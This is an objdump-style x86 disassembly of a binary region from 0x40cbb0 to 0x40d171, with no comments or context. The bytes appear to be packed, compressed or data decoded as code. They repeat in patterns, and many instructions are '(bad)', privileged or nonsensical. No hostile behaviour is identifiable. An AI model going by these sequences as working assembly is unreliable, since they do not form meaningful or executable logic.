  40cbb0:	08 69 9a 
  40cbb3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cbb4:	69 08 08 08 08 08    	imul   $0x8080808,(%eax),%ecx
  40cbba:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cbbb:	69 9a a6 08 08 08 08 	imul   $0xa69a0808,0x80808a6(%edx),%ebx
  40cbc2:	08 9a a6 
  40cbc5:	69 9a 08 08 08 08 08 	imul   $0x9a690808,0x8080808(%edx),%ebx
  40cbcc:	08 69 9a 
  40cbcf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cbd0:	69 08 08 08 08 08    	imul   $0x8080808,(%eax),%ecx
  40cbd6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cbd7:	69 9a a6 08 08 08 08 	imul   $0xa69a0808,0x80808a6(%edx),%ebx
  40cbde:	08 9a a6 
  40cbe1:	69 9a 08 08 08 08 08 	imul   $0xcb9a0808,0x8080808(%edx),%ebx
  40cbe8:	08 9a cb 
  40cbeb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40cbec:	69 08 08 2f 07 2b    	imul   $0x2b072f08,(%eax),%ecx
  40cbf2:	07                   	pop    %es
  40cbf3:	08 d3                	or     %dl,%bl
  40cbf5:	74 a6                	je     0x40cb9d
  40cbf7:	69 08 07 03 f6 f2    	imul   $0xf2f60307,(%eax),%ecx
  40cbfd:	4d                   	dec    %ebp
  40cbfe:	d3 34 4d ee ea e6 e2 	shll   %cl,-0x1d191512(,%ecx,2)
  40cc05:	de da                	(bad)
  40cc07:	34 4d                	xor    $0x4d,%al
  40cc09:	d3 34 d6             	shll   %cl,(%esi,%edx,8)
  40cc0c:	d2 ce                	ror    %cl,%dh
  40cc0e:	ca c6 d3             	lret   $0xd3c6
  40cc11:	34 4d                	xor    $0x4d,%al
  40cc13:	d3 c2                	rol    %cl,%edx
  40cc15:	be ba b6 b2 a6       	mov    $0xa6b2b6ba,%esi
  40cc1a:	69 9a 65 6b 05 67 63 	imul   $0x3a5b5f63,0x67056b65(%edx),%ebx
  40cc21:	5f 5b 3a 
  40cc24:	d3 6d 9a             	shrl   %cl,-0x66(%ebp)
  40cc27:	57                   	push   %edi
  40cc28:	53                   	push   %ebx
  40cc29:	24 05                	and    $0x5,%al
  40cc2b:	ff 07                	incl   (%edi)
  40cc2d:	03 86 36 cd b2 69    	add    0x69b2cd36(%esi),%eax
  40cc33:	82 3b 05             	cmpb   $0x5,(%ebx)
  40cc36:	37                   	aaa
  40cc37:	33 2f                	xor    (%edi),%ebp
  40cc39:	05 d3 34 9d e9       	add    $0xe99d34d3,%eax
  40cc3e:	ff 07                	incl   (%edi)
  40cc40:	03 66 62             	add    0x62(%esi),%esp
  40cc43:	5e                   	pop    %esi
  40cc44:	66 d9 34 4d 5a 56 52 	fnstenvs 0xb52565a(,%ecx,2)
  40cc4b:	0b 
  40cc4c:	05 07 4d d3 34       	add    $0x34d34d07,%eax
  40cc51:	dd 03                	fldl   (%ebx)
  40cc53:	05 ff 07 07 07       	add    $0x70707ff,%eax
  40cc58:	07                   	pop    %es
  40cc59:	07                   	pop    %es
  40cc5a:	34 4d                	xor    $0x4d,%al
  40cc5c:	d3 34 07             	shll   %cl,(%edi,%eax,1)
  40cc5f:	07                   	pop    %es
  40cc60:	07                   	pop    %es
  40cc61:	07                   	pop    %es
  40cc62:	07                   	pop    %es
  40cc63:	d3 2c 4d d3 07 07 07 	shrl   %cl,0x70707d3(,%ecx,2)
  40cc6a:	0e                   	push   %cs
  40cc6b:	0a 9a ce 34 cd 07    	or     0x7cd34ce(%edx),%bl
  40cc71:	07                   	pop    %es
  40cc72:	06                   	push   %es
  40cc73:	03 f6                	add    %esi,%esi
  40cc75:	f2 69 9a a6 69 ee ea 	repnz imul $0xb3dee2e6,-0x1511965a(%edx),%ebx
  40cc7c:	e6 e2 de b3 
  40cc80:	6c                   	insb   (%dx),%es:(%edi)
  40cc81:	9a a6 da d6 d2 8b 04 	lcall  $0x48b,$0xd2d6daa6
  40cc88:	87 4d d3             	xchg   %ecx,-0x2d(%ebp)
  40cc8b:	99                   	cltd
  40cc8c:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc8d:	83 04 ff 06          	addl   $0x6,(%edi,%edi,8)
  40cc91:	03 ba b6 b2 34 4d    	add    0x4d34b2b6(%edx),%edi
  40cc97:	d3 34 ae             	shll   %cl,(%esi,%ebp,4)
  40cc9a:	aa                   	stos   %al,%es:(%edi)
  40cc9b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cc9c:	a2 9e d3 34 4d       	mov    %al,0x4d34d39e
  40cca1:	d3 9a 96 92 8e 8a    	rcrl   %cl,-0x75716d6a(%edx)
  40cca7:	4d                   	dec    %ebp
  40cca8:	d3 34 4d 86 82 7e 7a 	shll   %cl,0x7a7e8286(,%ecx,2)
  40ccaf:	76 72                	jbe    0x40cd23
  40ccb1:	9a a6 69 ba 06 ff 06 	lcall  $0x6ff,$0x6ba69a6
  40ccb8:	06                   	push   %es
  40ccb9:	06                   	push   %es
  40ccba:	06                   	push   %es
  40ccbb:	06                   	push   %es
  40ccbc:	69 9a a6 69 06 06 06 	imul   $0xd3040406,0x60669a6(%edx),%ebx
  40ccc3:	04 04 d3 
  40ccc6:	34 cd                	xor    $0xcd,%al
  40ccc8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40ccc9:	04 ff                	add    $0xff,%al
  40cccb:	03 06                	add    (%esi),%eax
  40cccd:	06                   	push   %es
  40ccce:	06                   	push   %es
  40cccf:	4d                   	dec    %ebp
  40ccd0:	d3 34 4d 06 06 06 06 	shll   %cl,0x6060606(,%ecx,2)
  40ccd7:	06                   	push   %es
  40ccd8:	06                   	push   %es
  40ccd9:	34 4d                	xor    $0x4d,%al
  40ccdb:	d3 34 06             	shll   %cl,(%esi,%eax,1)
  40ccde:	06                   	push   %es
  40ccdf:	06                   	push   %es
  40cce0:	06                   	push   %es
  40cce1:	06                   	push   %es
  40cce2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cce3:	33 4d d3             	xor    -0x2d(%ebp),%ecx
  40cce6:	06                   	push   %es
  40cce7:	06                   	push   %es
  40cce8:	05 03 f6 9a a6       	add    $0xa69af603,%eax
  40cced:	69 9a f2 ee ea e6 e2 	imul   $0x9a69dee2,-0x1915110e(%edx),%ebx
  40ccf4:	de 69 9a 
  40ccf7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40ccf8:	69 da d6 d2 ce ca    	imul   $0xcaced2d6,%edx,%ebx
  40ccfe:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40ccff:	69 9a a6 c6 c2 be ba 	imul   $0xa69ab6ba,-0x413d395a(%edx),%ebx
  40cd06:	b6 9a a6 
  40cd09:	69 9a b2 ae aa a6 a2 	imul   $0x9a699ea2,-0x5955514e(%edx),%ebx
  40cd10:	9e 69 9a 
  40cd13:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd14:	69 9a 96 92 8e 8a 69 	imul   $0xa69a1a69,-0x75716d6a(%edx),%ebx
  40cd1b:	1a 9a a6 
  40cd1e:	86 82 7e ff 7a 76    	xchg   %al,0x767aff7e(%edx)
  40cd24:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd25:	69 9a a7 72 05 05 05 	imul   $0xa59a0505,0x50572a7(%edx),%ebx
  40cd2c:	05 9a a5 
  40cd2f:	69 9a 05 05 05 05 4e 	imul   $0x9a694a4e,0x5050505(%edx),%ebx
  40cd36:	4a 69 9a 
  40cd39:	ee                   	out    %al,(%dx)
  40cd3a:	69 46 05 ff 05 05 05 	imul   $0x50505ff,0x5(%esi),%eax
  40cd41:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd42:	69 9a a6 05 05 05 05 	imul   $0xa69a0505,0x50505a6(%edx),%ebx
  40cd49:	05 9a a6 
  40cd4c:	69 9a 05 05 05 05 05 	imul   $0x9a690505,0x5050505(%edx),%ebx
  40cd53:	05 69 9a 
  40cd56:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd57:	69 05 05 04 04 04 a6 	imul   $0xa69a69a6,0x4040405,%eax
  40cd5e:	69 9a a6 
  40cd61:	04 04                	add    $0x4,%al
  40cd63:	04 04                	add    $0x4,%al
  40cd65:	04 9a                	add    $0x9a,%al
  40cd67:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd68:	69 9a 04 04 04 04 04 	imul   $0x9a690404,0x4040404(%edx),%ebx
  40cd6f:	04 69 9a 
  40cd72:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd73:	69 04 04 04 04 04 a6 	imul   $0xa6040404,(%esp,%eax,1),%eax
  40cd7a:	69 9a a6 04 04 04 04 	imul   $0xa69a0404,0x40404a6(%edx),%ebx
  40cd81:	04 9a a6 
  40cd84:	69 9a 04 04 04 04 04 	imul   $0x9a690404,0x4040404(%edx),%ebx
  40cd8b:	04 69 9a 
  40cd8e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cd8f:	69 04 04 04 04 04 a6 	imul   $0xa6040404,(%esp,%eax,1),%eax
  40cd96:	69 9a a6 04 04 04 04 	imul   $0xa69a0404,0x40404a6(%edx),%ebx
  40cd9d:	04 9a a6 
  40cda0:	69 9a 04 04 04 04 04 	imul   $0x9a690404,0x4040404(%edx),%ebx
  40cda7:	04 69 9a 
  40cdaa:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cdab:	69 04 04 04 04 04 a6 	imul   $0xa6040404,(%esp,%eax,1),%eax
  40cdb2:	69 9a a6 04 04 04 04 	imul   $0xa69a0404,0x40404a6(%edx),%ebx
  40cdb9:	04 9a a6 
  40cdbc:	69 9a 04 04 04 04 04 	imul   $0x99d30404,0x4040404(%edx),%ebx
  40cdc3:	04 d3 99 
  40cdc6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cdc7:	69 04 04 03 03 f6 4d 	imul   $0x4df60303,(%esp,%eax,1),%eax
  40cdce:	d3 34 4d f2 ee ea e6 	shll   %cl,-0x1915110e(,%ecx,2)
  40cdd5:	e2 de                	loop   0x40cdb5
  40cdd7:	96                   	xchg   %eax,%esi
  40cdd8:	4d                   	dec    %ebp
  40cdd9:	d3 34 da             	shll   %cl,(%edx,%ebx,8)
  40cddc:	d6                   	salc
  40cddd:	d2 21                	shlb   %cl,(%ecx)
  40cddf:	01 1d 69 9a a6 69    	add    %ebx,0x69a69a69
  40cde5:	19 15 12 36 3d d3    	sbb    %edx,0xd33d3612
  40cdeb:	2c 9b                	sub    $0x9b,%al
  40cded:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cdee:	05 01 fd 00 f9       	add    $0xf900fd01,%eax
  40cdf3:	f5                   	cmc
  40cdf4:	4d                   	dec    %ebp
  40cdf5:	d3 34 4d f2 ed e9 e5 	shll   %cl,-0x1a16120e(,%ecx,2)
  40cdfc:	e1 dd                	loope  0x40cddb
  40cdfe:	34 4d                	xor    $0x4d,%al
  40ce00:	d3 34 d9             	shll   %cl,(%ecx,%ebx,8)
  40ce03:	d5 d2                	aad    $0xd2
  40ce05:	cd c9                	int    $0xc9
  40ce07:	d3 34 4d d3 c5 c1 bd 	shll   %cl,-0x423e3a2d(,%ecx,2)
  40ce0e:	b9 b5 7f d3 34       	mov    $0x34d37fb5,%ecx
  40ce13:	4d                   	dec    %ebp
  40ce14:	b1 ad                	mov    $0xad,%cl
  40ce16:	a9 a5 5e ff 75       	test   $0x75ff5ea5,%eax
  40ce1b:	2f                   	das
  40ce1c:	8f 45 23             	pop    0x23(%ebp)
  40ce1f:	5d                   	pop    %ebp
  40ce20:	81 16 e2 c6 45 22    	adcl   $0x2245c6e2,(%esi)
  40ce26:	64 02 1d 06 06 e6 8a 	add    %fs:0x8ae60606,%bl
  40ce2d:	ee                   	out    %al,(%dx)
  40ce2e:	3f                   	aas
  40ce2f:	83 7d 33 40          	cmpl   $0x40,0x33(%ebp)
  40ce33:	75 07                	jne    0x40ce3c
  40ce35:	0c 40                	or     $0x40,%al
  40ce37:	d4 21                	aam    $0x21
  40ce39:	41                   	inc    %ecx
  40ce3a:	bf bd c0 0f 91       	mov    $0x910fc0bd,%edi
  40ce3f:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
  40ce42:	b1 83                	mov    $0x83,%cl
  40ce44:	c0 04 ff d0          	rolb   $0xd0,(%edi,%edi,8)
  40ce48:	33 f0                	xor    %eax,%esi
  40ce4a:	bf bb 5e 74 06       	mov    $0x6745ebb,%edi
  40ce4f:	14 2b                	adc    $0x2b,%al
  40ce51:	45                   	inc    %ebp
  40ce52:	2f                   	das
  40ce53:	5e                   	pop    %esi
  40ce54:	5a                   	pop    %edx
  40ce55:	59                   	pop    %ecx
  40ce56:	83 c4 27             	add    $0x27,%esp
  40ce59:	5d                   	pop    %ebp
  40ce5a:	bb 2b ff bd 1f       	mov    $0x1fbdff2b,%ebx
  40ce5f:	72 1a                	jb     0x40ce7b
  40ce61:	00 40 01             	add    %al,0x1(%eax)
  40ce64:	25 c7 75 3c 31       	and    $0x313c75c7,%eax
  40ce69:	d2 f7                	shl    %cl,%bh
  40ce6b:	f1                   	int1
  40ce6c:	89 64 db 36          	mov    %esp,0x36(%ebx,%ebx,8)
  40ce70:	c4 45 0a             	les    0xa(%ebp),%eax
  40ce73:	0f 04                	(bad)
  40ce75:	83 23 01             	andl   $0x1,(%ebx)
  40ce78:	08 02                	or     %al,(%edx)
  40ce7a:	9b                   	fwait
  40ce7b:	09 6e 7f             	or     %ebp,0x7f(%esi)
  40ce7e:	04 89                	add    $0x89,%al
  40ce80:	55                   	push   %ebp
  40ce81:	0e                   	push   %cs
  40ce82:	c1 e0 e4             	shl    $0xe4,%eax
  40ce85:	f0 05 94 5c 90 b7    	lock add $0xb7905c94,%eax
  40ce8b:	3f                   	aas
  40ce8c:	d8 20                	fsubs  (%eax)
  40ce8e:	c3                   	ret
  40ce8f:	41                   	inc    %ecx
  40ce90:	83 e0 38             	and    $0x38,%eax
  40ce93:	c1 e8 03             	shr    $0x3,%eax
  40ce96:	39 16                	cmp    %edx,(%esi)
  40ce98:	c3                   	ret
  40ce99:	cb                   	lret
  40ce9a:	d9 bb b5 c3 8c 93    	fnstcw -0x6c733c4b(%ebx)
  40cea0:	7c 21                	jl     0x40cec3
  40cea2:	3c 1b                	cmp    $0x1b,%al
  40cea4:	02 07                	add    (%edi),%al
  40cea6:	89 6d a3             	mov    %ebp,-0x5d(%ebp)
  40cea9:	6d                   	insl   (%dx),%es:(%edi)
  40ceaa:	18 12                	sbb    %dl,(%edx)
  40ceac:	16                   	push   %ss
  40cead:	82 75 58 7d          	xorb   $0x7d,0x58(%ebp)
  40ceb1:	77 e7                	ja     0x40ce9a
  40ceb3:	64 b3 59             	fs mov $0x59,%bl
  40ceb6:	50                   	push   %eax
  40ceb7:	27                   	daa
  40ceb8:	0a 10                	or     (%eax),%dl
  40ceba:	75 b6                	jne    0x40ce72
  40cebc:	e6 36                	out    %al,$0x36
  40cebe:	c4 02                	les    (%edx),%eax
  40cec0:	c3                   	ret
  40cec1:	68 65 8b 3c 3b       	push   $0x3b3c8b65
  40cec6:	0f 23 b7             	mov    %edi,%db6
  40cec9:	74 6f                	je     0x40cf3a
  40cecb:	5b                   	pop    %ebx
  40cecc:	ff 04 c3             	incl   (%ebx,%eax,8)
  40cecf:	08 23                	or     %ah,(%ebx)
  40ced1:	02 06                	add    (%esi),%al
  40ced3:	1e                   	push   %ds
  40ced4:	7b 91                	jnp    0x40ce67
  40ced6:	b3 df                	mov    $0xdf,%bl
  40ced8:	fe                   	(bad)
  40ced9:	24 1d                	and    $0x1d,%al
  40cedb:	6c                   	insb   (%dx),%es:(%edi)
  40cedc:	11 09                	adc    %ecx,(%ecx)
  40cede:	25 14 dc 9b 35       	and    $0x359bdc14,%eax
  40cee3:	0c 0a                	or     $0xa,%al
  40cee5:	06                   	push   %es
  40cee6:	0b 15 24 3d bf af    	or     0xafbf3d24,%edx
  40ceec:	db 65 05             	(bad) 0x5(%ebp)
  40ceef:	41                   	inc    %ecx
  40cef0:	05 46 03 0f 40       	add    $0x400f0346,%eax
  40cef5:	75 09                	jne    0x40cf00
  40cef7:	58                   	pop    %eax
  40cef8:	b2 80                	mov    $0x80,%dl
  40cefa:	8c 1a                	mov    %ds,(%edx)
  40cefc:	75 49                	jne    0x40cf47
  40cefe:	43                   	inc    %ebx
  40ceff:	91                   	xchg   %eax,%ecx
  40cf00:	e0 4c                	loopne 0x40cf4e
  40cf02:	c3                   	ret
  40cf03:	22 62 40             	and    0x40(%edx),%ah
  40cf06:	10 51 e8             	adc    %dl,-0x18(%ecx)
  40cf09:	26 1b 84 7c c3 2b 23 	sbb    %es:0x9232bc3(%esp,%edi,2),%eax
  40cf10:	09 
  40cf11:	fe                   	(bad)
  40cf12:	37                   	aaa
  40cf13:	b2 61                	mov    $0x61,%dl
  40cf15:	5f                   	pop    %edi
  40cf16:	95                   	xchg   %eax,%ebp
  40cf17:	80 7d 22 0f          	cmpb   $0xf,0x22(%ebp)
  40cf1b:	7b 33                	jnp    0x40cf50
  40cf1d:	62 62 df             	bound  %esp,-0x21(%edx)
  40cf20:	00 ec                	add    %ch,%ah
  40cf22:	01 c3                	add    %eax,%ebx
  40cf24:	27                   	daa
  40cf25:	b0 0a                	mov    $0xa,%al
  40cf27:	8b 25 ec 30 e9 95    	mov    0x95e930ec,%esp
  40cf2d:	04 01                	add    $0x1,%al
  40cf2f:	da d9                	fcmovu %st(1),%st
  40cf31:	b2 d9                	mov    $0xd9,%dl
  40cf33:	9b                   	fwait
  40cf34:	10 1f                	adc    %bl,(%edi)
  40cf36:	bf 1a 30 84 e4       	mov    $0xe484301a,%edi
  40cf3b:	c2 84 47             	ret    $0x4784
  40cf3e:	33 0a                	xor    (%edx),%ecx
  40cf40:	03 d3                	add    %ebx,%edx
  40cf42:	bd 24 27 03 06       	mov    $0x6032724,%ebp
  40cf47:	3d 0f 10 68 6e       	cmp    $0x6e68100f,%eax
  40cf4c:	09 b3 1a 13 1f aa    	or     %esi,-0x55e0ece6(%ebx)
  40cf52:	db c0                	fcmovnb %st(0),%st
  40cf54:	16                   	push   %ss
  40cf55:	d6                   	salc
  40cf56:	d5 41                	aad    $0x41
  40cf58:	11 0b                	adc    %ecx,(%ebx)
  40cf5a:	01 65 03             	add    %esp,0x3(%ebp)
  40cf5d:	84 24 9f             	test   %ah,(%edi,%ebx,4)
  40cf60:	94                   	xchg   %eax,%esp
  40cf61:	38 36                	cmp    %dh,(%esi)
  40cf63:	9b                   	fwait
  40cf64:	84 6b 07             	test   %ch,0x7(%ebx)
  40cf67:	72 2e                	jb     0x40cf97
  40cf69:	74 10                	je     0x40cf7b
  40cf6b:	b2 21                	mov    $0x21,%dl
  40cf6d:	e1 42                	loope  0x40cfb1
  40cf6f:	ed                   	in     (%dx),%eax
  40cf70:	06                   	push   %es
  40cf71:	fd                   	std
  40cf72:	04 42                	add    $0x42,%al
  40cf74:	ad                   	lods   %ds:(%esi),%eax
  40cf75:	e4 f6                	in     $0xf6,%al
  40cf77:	25 2b ae 75 16       	and    $0x1675ae2b,%eax
  40cf7c:	00 5e 59             	add    %bl,0x59(%esi)
  40cf7f:	4a                   	dec    %edx
  40cf80:	98                   	cwtl
  40cf81:	c1 e0 cc             	shl    $0xcc,%eax
  40cf84:	b8 ff 09 87 95       	mov    $0x958709ff,%eax
  40cf89:	e0 00                	loopne 0x40cf8b
  40cf8b:	3d ab 88 64 97       	cmp    $0x976488ab,%eax
  40cf90:	c5 02                	lds    (%edx),%eax
  40cf92:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40cf93:	7e 0b                	jle    0x40cfa0
  40cf95:	b0 5b                	mov    $0x5b,%al
  40cf97:	c6                   	(bad)
  40cf98:	90                   	nop
  40cf99:	dd 03                	fldl   (%ebx)
  40cf9b:	4a                   	dec    %edx
  40cf9c:	16                   	push   %ss
  40cf9d:	01 c5                	add    %eax,%ebp
  40cf9f:	4b                   	dec    %ebx
  40cfa0:	23 64 0a 3b          	and    0x3b(%edx,%ecx,1),%esp
  40cfa4:	32 37                	xor    (%edi),%dh
  40cfa6:	06                   	push   %es
  40cfa7:	6f                   	outsl  %ds:(%esi),(%dx)
  40cfa8:	95                   	xchg   %eax,%ebp
  40cfa9:	4c                   	dec    %esp
  40cfaa:	61                   	popa
  40cfab:	31 04 20             	xor    %eax,(%eax,%eiz,1)
  40cfae:	18 f2                	sbb    %dh,%dl
  40cfb0:	2d 90 7e 1b 06       	sub    $0x61b7e90,%eax
  40cfb5:	2a 3b                	sub    (%ebx),%bh
  40cfb7:	84 4d 73             	test   %cl,0x73(%ebp)
  40cfba:	41                   	inc    %ecx
  40cfbb:	05 7e 94 0b c4       	add    $0xc40b947e,%eax
  40cfc0:	fa                   	cli
  40cfc1:	63 1a                	arpl   %ebx,(%edx)
  40cfc3:	65 0f 85 ac 87 62 0f 	gs jne 0xfa35776
  40cfca:	39 ec                	cmp    %ebp,%esp
  40cfcc:	cd dc                	int    $0xdc
  40cfce:	8e a2 09 34 82 1f    	mov    0x1f823409(%edx),%fs
  40cfd4:	8c 93 0f 64 39 01    	mov    %ss,0x139640f(%ebx)
  40cfda:	82 02 75             	addb   $0x75,(%edx)
  40cfdd:	10 8d b1 31 b0 6c    	adc    %cl,0x6cb031b1(%ebp)
  40cfe3:	15 b5 0c bb 5a       	adc    $0x5abb0cb5,%eax
  40cfe8:	36 c9                	ss leave
  40cfea:	20 93 11 04 48 05    	and    %dl,0x5480411(%ebx)
  40cff0:	fd                   	std
  40cff1:	4f                   	dec    %edi
  40cff2:	36 d8 1b             	fcomps %ss:(%ebx)
  40cff5:	cc                   	int3
  40cff6:	1d 2a 11 07 75       	sbb    $0x7507112a,%eax
  40cffb:	1e                   	push   %ds
  40cffc:	26 ff 0e             	decl   %es:(%esi)
  40cfff:	23 18                	and    (%eax),%ebx
  40d001:	dc 1d 0e 00 74 0c    	fcompl 0xc74000e
  40d007:	c9                   	leave
  40d008:	91                   	xchg   %eax,%ecx
  40d009:	bd c8 d0 04 7d       	mov    $0x7d04d0c8,%ebp
  40d00e:	f1                   	int1
  40d00f:	03 64 c0 2e          	add    0x2e(%eax,%eax,8),%esp
  40d013:	1b 77 02             	sbb    0x2(%edi),%esi
  40d016:	0b 03                	or     (%ebx),%eax
  40d018:	c2 94 4d             	ret    $0x4d94
  40d01b:	06                   	push   %es
  40d01c:	04 a7                	add    $0xa7,%al
  40d01e:	07                   	pop    %es
  40d01f:	90                   	nop
  40d020:	09 3b                	or     %edi,(%ebx)
  40d022:	b0 40                	mov    $0x40,%al
  40d024:	57                   	push   %edi
  40d025:	01 63 2c             	add    %esp,0x2c(%ebx)
  40d028:	84 9d a4 11 cc 74    	test   %bl,0x74cc11a4(%ebp)
  40d02e:	52                   	push   %edx
  40d02f:	6e                   	outsb  %ds:(%esi),(%dx)
  40d030:	22 96 85 10 06 2f    	and    0x2f061085(%esi),%dl
  40d036:	21 22                	and    %esp,(%edx)
  40d038:	22 c2                	and    %dl,%al
  40d03a:	86 10                	xchg   %dl,(%eax)
  40d03c:	08 03                	or     %al,(%ebx)
  40d03e:	8a 2e                	mov    (%esi),%ch
  40d040:	e4 c7                	in     $0xc7,%al
  40d042:	e4 15                	in     $0x15,%al
  40d044:	3c 84                	cmp    $0x84,%al
  40d046:	7b 1d                	jnp    0x40d065
  40d048:	18 c8                	sbb    %cl,%al
  40d04a:	81 bd 5d 65 5e 80 71 	cmpl   $0x9f4d9571,-0x7fa19aa3(%ebp)
  40d051:	95 4d 9f 
  40d054:	9a 29 4c 80 2d c2 de 	lcall  $0xdec2,$0x2d804c29
  40d05b:	17                   	pop    %ss
  40d05c:	51                   	push   %ecx
  40d05d:	b7 9f                	mov    $0x9f,%bh
  40d05f:	73 60                	jae    0x40d0c1
  40d061:	0b e9                	or     %ecx,%ebp
  40d063:	85 a0 12 1a 85 6c    	test   %esp,0x6c851a12(%eax)
  40d069:	21 27                	and    %esp,(%edi)
  40d06b:	b0 d5                	mov    $0xd5,%al
  40d06d:	85 6a 7d             	test   %ebp,0x7d(%edx)
  40d070:	06                   	push   %es
  40d071:	2c 84                	sub    $0x84,%al
  40d073:	bd 75 53 c9 22       	mov    $0x22c95375,%ebp
  40d078:	30 b1 97 9c c0 d4    	xor    %dh,-0x2b3f6369(%ecx)
  40d07e:	75 19                	jne    0x40d099
  40d080:	7f 07                	jg     0x40d089
  40d082:	16                   	push   %ss
  40d083:	36 60                	ss pusha
  40d085:	83 8c eb 92 39 51 c0 	orl    $0x9,-0x3faec66e(%ebx,%ebp,8)
  40d08c:	09 
  40d08d:	8c 03                	mov    %es,(%ebx)
  40d08f:	5b                   	pop    %ebx
  40d090:	16                   	push   %ss
  40d091:	3a 1d 21 2d b0 12    	cmp    0x12b02d21,%bl
  40d097:	12 b8 82 30 4d 98    	adc    -0x67b2cf7e(%eax),%bh
  40d09d:	18 18                	sbb    %bl,(%eax)
  40d09f:	55                   	push   %ebp
  40d0a0:	10 0b                	adc    %cl,(%ebx)
  40d0a2:	48                   	dec    %eax
  40d0a3:	84 92 1f 7b 29 ed    	test   %dl,-0x12d684e1(%edx)
  40d0a9:	c8 fe 23 4d          	enter  $0x23fe,$0x4d
  40d0ad:	06                   	push   %es
  40d0ae:	d1 e9                	shr    $1,%ecx
  40d0b0:	89 5d 06             	mov    %ebx,0x6(%ebp)
  40d0b3:	31 8b 12 ff 11 12    	xor    %ecx,0x1211ff12(%ebx)
  40d0b9:	ed                   	in     (%dx),%eax
  40d0ba:	d1 e1                	shl    $1,%ecx
  40d0bc:	89 1c 7c             	mov    %ebx,(%esp,%edi,2)
  40d0bf:	00 3c a4             	add    %bh,(%esp,%eiz,4)
  40d0c2:	74 12                	je     0x40d0d6
  40d0c4:	3c a7                	cmp    $0xa7,%al
  40d0c6:	85 fe                	test   %edi,%esi
  40d0c8:	42                   	inc    %edx
  40d0c9:	ff 74 0e 3c          	push   0x3c(%esi,%ecx,1)
  40d0cd:	ae                   	scas   %es:(%edi),%al
  40d0ce:	74 0a                	je     0x40d0da
  40d0d0:	3c af                	cmp    $0xaf,%al
  40d0d2:	2b 3c 0f             	sub    (%edi,%ecx,1),%edi
  40d0d5:	74 02                	je     0x40d0d9
  40d0d7:	eb 04                	jmp    0x40d0dd
  40d0d9:	65 58                	gs pop %eax
  40d0db:	37                   	aaa
  40d0dc:	b2 06                	mov    $0x6,%dl
  40d0de:	2c 4a                	sub    $0x4a,%al
  40d0e0:	13 00                	adc    (%eax),%eax
  40d0e2:	46                   	inc    %esi
  40d0e3:	77 ff                	ja     0x40d0e4
  40d0e5:	dd 57 90             	fstl   -0x70(%edi)
  40d0e8:	74 3e                	je     0x40d128
  40d0ea:	4a                   	dec    %edx
  40d0eb:	3a 3c a5 74 36 3c a6 	cmp    -0x59c3c98c(,%eiz,4),%bh
  40d0f2:	74 32                	je     0x40d126
  40d0f4:	52                   	push   %edx
  40d0f5:	2e 3c aa             	cs cmp $0xaa,%al
  40d0f8:	77 d3                	ja     0x40d0cd
  40d0fa:	fd                   	std
  40d0fb:	ff 74 2a 3c          	push   0x3c(%edx,%ebp,1)
  40d0ff:	ab                   	stos   %eax,%es:(%edi)
  40d100:	74 26                	je     0x40d128
  40d102:	3c ac                	cmp    $0xac,%al
  40d104:	74 22                	je     0x40d128
  40d106:	3c ad                	cmp    $0xad,%al
  40d108:	74 1e                	je     0x40d128
  40d10a:	62 1a                	bound  %ebx,(%edx)
  40d10c:	16                   	push   %ss
  40d10d:	3c 6c                	cmp    $0x6c,%al
  40d10f:	72 20                	jb     0x40d131
  40d111:	97                   	xchg   %eax,%edi
  40d112:	34 4d                	xor    $0x4d,%al
  40d114:	6d                   	insl   (%dx),%es:(%edi)
  40d115:	6e                   	outsb  %ds:(%esi),(%dx)
  40d116:	6f                   	outsl  %ds:(%esi),(%dx)
  40d117:	01 e0                	add    %esp,%eax
  40d119:	2d 85 0c 01 26       	sub    $0x26010c85,%eax
  40d11e:	84 8e 00 64 22 9b    	test   %cl,-0x64dd9c00(%esi)
  40d124:	19 0f                	sbb    %ecx,(%edi)
  40d126:	2a 26                	sub    (%esi),%ah
  40d128:	08 61 b4             	or     %ah,-0x4c(%ecx)
  40d12b:	e4 02                	in     $0x2,%al
  40d12d:	0c 22                	or     $0x22,%al
  40d12f:	c8 61 b0 79          	enter  $0xb061,$0x79
  40d133:	3d bf 7f 11 3d       	cmp    $0x3d117fbf,%eax
  40d138:	07                   	pop    %es
  40d139:	32 38                	xor    (%eax),%bh
  40d13b:	c0 46 35 17          	rolb   $0x17,0x35(%esi)
  40d13f:	8f                   	(bad)
  40d140:	be 7b 32 76 75       	mov    $0x7576327b,%esi
  40d145:	69 3b 63 3d c0 1d    	imul   $0x1dc03d63,(%ebx),%edi
  40d14b:	7c 56                	jl     0x40d1a3
  40d14d:	89 c2                	mov    %eax,%edx
  40d14f:	c1 e0 06             	shl    $0x6,%eax
  40d152:	ff ad 75 89 c1 83    	ljmp   *-0x7c3e768b(%ebp)
  40d158:	e1 0f                	loope  0x40d169
  40d15a:	83 fa 0d             	cmp    $0xd,%edx
  40d15d:	e3 83                	jecxz  0x40d0e2
  40d15f:	f9                   	stc
  40d160:	81 f2 36 59 a9 42    	xor    $0x42a95936,%edx
  40d166:	0f 0e                	femms
  40d168:	75 37                	jne    0x40d1a1
  40d16a:	65 97                	gs xchg %eax,%edi
  40d16c:	5c                   	pop    %esp
  40d16d:	b2 25                	mov    $0x25,%dl
  40d16f:	0a 03                	or     (%ebx),%al
  40d171:	06                   	push   %es
